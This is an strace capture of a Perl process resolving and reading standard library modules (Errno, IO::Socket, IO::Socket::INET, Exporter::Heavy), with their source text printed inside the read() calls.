9851  20:00:43.726922 stat64("/etc/perl/Errno.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.726937 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.726949 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.726964 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.726976 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.727001 stat64("/usr/lib/perl5/Errno.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.727013 stat64("/usr/lib/perl5/Errno.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.727027 stat64("/usr/share/perl5/Errno.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.727039 stat64("/usr/share/perl5/Errno.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.727052 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.727065 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
9851  20:00:43.727086 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.727101 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.727113 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.727133 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
9851  20:00:43.727861 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
9851  20:00:43.728324 _llseek(8, 5966, [5966], SEEK_SET) = 0
9851  20:00:43.728341 _llseek(8, 0, [5966], SEEK_CUR) = 0
9851  20:00:43.728352 close(8)          = 0
9851  20:00:43.728708 brk(0x827b000)    = 0x827b000
9851  20:00:43.728836 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
9851  20:00:43.728968 _llseek(6, 6698, [6698], SEEK_SET) = 0
9851  20:00:43.728969 _llseek(6, 0, [6698], SEEK_CUR) = 0
9851  20:00:43.728969 close(6)          = 0
9851  20:00:43.728976 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.728991 stat64("/etc/perl/IO/Socket/INET.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.729005 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.729053 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.729068 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.729098 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.729113 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.729125 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.729138 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.729150 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.729164 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.729177 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
9851  20:00:43.729199 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
9851  20:00:43.729214 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9efc68) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.729225 _llseek(6, 0, [0], SEEK_CUR) = 0
9851  20:00:43.729242 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
9851  20:00:43.729842 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.730015 stat64("/etc/perl/Exporter/Heavy.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.730096 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.730141 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.730173 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.730198 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.730221 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.730234 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.730248 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.730260 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.730273 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.730286 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.730304 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.730318 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
9851  20:00:43.730339 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.730354 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.730365 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.730383 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
9851  20:00:43.731248 read(8,  <unfinished ...>
9849  20:00:43.731269 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9849  20:00:43.731292 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9849  20:00:43.731307 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9849  20:00:43.731318 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9849  20:00:43.731330 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
9849  20:00:43.731344 waitpid(-1,  <unfinished ...>
